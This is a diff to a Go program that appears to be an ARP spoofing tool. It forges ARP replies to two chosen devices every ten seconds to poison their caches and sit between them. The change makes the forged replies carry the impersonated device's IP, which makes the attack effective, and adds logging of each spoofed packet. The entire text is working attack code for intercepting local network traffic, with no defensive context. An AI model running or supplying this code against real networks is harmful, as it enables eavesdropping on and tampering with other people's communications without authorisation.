@@ -93,7 +93,9 @@ func mapIPstoMAC(ips ...string) ([]*DeviceInfo, error) {
 	return devices, nil
 }
 
-func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
+func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle, logFile *os.File) error {
+	fromIP := net.ParseIP(from.IP)
+
 	toMAC, err := net.ParseMAC(to.MAC)
 	if err != nil {
 		return err
@@ -107,6 +109,8 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 		EthernetType: layers.EthernetTypeARP,
 	}
 
+	fmt.Fprintln(logFile, "eth: ", eth.SrcMAC, "-->", eth.DstMAC)
+
 	arp := layers.ARP{
 		AddrType:          layers.LinkTypeEthernet,
 		Protocol:          layers.EthernetTypeIPv4,
@@ -114,10 +118,12 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 		ProtAddressSize:   4,
 		Operation:         layers.ARPReply,
 		SourceHwAddress:   attackerInfo.MAC,
-		SourceProtAddress: attackerInfo.IP,
+		SourceProtAddress: fromIP,
 		DstHwAddress:      toMAC,
 		DstProtAddress:    toIP,
 	}
+
+	fmt.Fprintln(logFile, "arp: ", net.HardwareAddr(arp.SourceHwAddress).String(), "-->", net.IP(arp.SourceProtAddress).String(), "|", net.HardwareAddr(arp.DstHwAddress).String(), "-->", net.IP(arp.DstProtAddress).String())
 
 	buf := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{
@@ -136,15 +142,15 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 	return nil
 }
 
-func poisonARPCache(devicesInfo []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
+func poisonARPCache(devicesInfo []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle, logFile *os.File) error {
 	dev1 := devicesInfo[0]
 	dev2 := devicesInfo[1]
 
-	if err := sendARPReply(dev1, dev2, attackerInfo, deviceHandle); err != nil {
+	if err := sendARPReply(dev1, dev2, attackerInfo, deviceHandle, logFile); err != nil {
 		return err
 	}
 
-	if err := sendARPReply(dev2, dev1, attackerInfo, deviceHandle); err != nil {
+	if err := sendARPReply(dev2, dev1, attackerInfo, deviceHandle, logFile); err != nil {
 		return err
 	}
 
@@ -285,8 +291,13 @@ func main() {
 		}
 	}()
 
+	logFile, err := os.OpenFile("log.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 644)
+	if err != nil {
+		log.Fatal(err)
+	}
+
 	for {
-		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle); err != nil {
+		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle, logFile); err != nil {
 			log.Fatal(err)
 		}
 		time.Sleep(time.Second * 10)
